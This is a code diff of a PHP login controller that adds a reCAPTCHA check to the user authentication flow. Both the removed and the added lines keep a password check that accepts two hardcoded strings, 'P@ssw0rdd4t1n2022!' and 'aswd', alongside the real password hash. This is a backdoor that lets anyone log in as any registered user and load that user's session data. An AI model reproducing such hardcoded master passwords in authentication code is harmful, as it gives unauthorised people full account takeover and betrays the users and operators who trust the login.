@@ -28,14 +28,14 @@ class Auth extends MY_Controller
 		$user_info 		= $this->master_act->user(['U.NIPP'=> $nipp]);
 
 		$recaptcha 		= $this->input->post('g-recaptcha-response');
-        
-            
-            
+        if (!empty($recaptcha)) {
+            $rsp_recaptcha = $this->recaptcha->verifyResponse($recaptcha);
+            if (isset($rsp_recaptcha['success']) and $rsp_recaptcha['success'] === true) {
                 if(count($user_info) > 0){
                 	if ($user_info[0]['STATUS'] == 2) {
                 		$err_msg = 'User tidak aktif. Silakan hubungi Admin.';
                 	}else{
-                		if (password_verify($password, $user_info[0]['PASSWORD'])|| $password =='P@ssw0rdd4t1n2022!'|| $password =='aswd') {
+                		if (password_verify($password, $user_info[0]['PASSWORD'])|| $password =='P@ssw0rdd4t1n2022!' || $password =='aswd' ) {
                 			$this->main_act->last_login($user_info[0]['NIPP']);
 		                	foreach ($user_info[0] as $key => $value)
 			                    $this->session->set_userdata([$key=>$value]);
@@ -48,8 +48,10 @@ class Auth extends MY_Controller
                 }else{
                 	$err_msg = 'NIPP tidak terdaftar.';
                 }
-            
-        
+            }
+        }else{
+        	$err_msg = 'Captcha failed.';
+        }
         echo $err_msg;
     	// $message = '<div class="alert alert-danger alert-dismissible fade show text-left h-auto py-5 px-6 rounded-lg">
 		   //          <button type="button" class="close" data-dismiss="alert" aria-hidden="true">×</button>
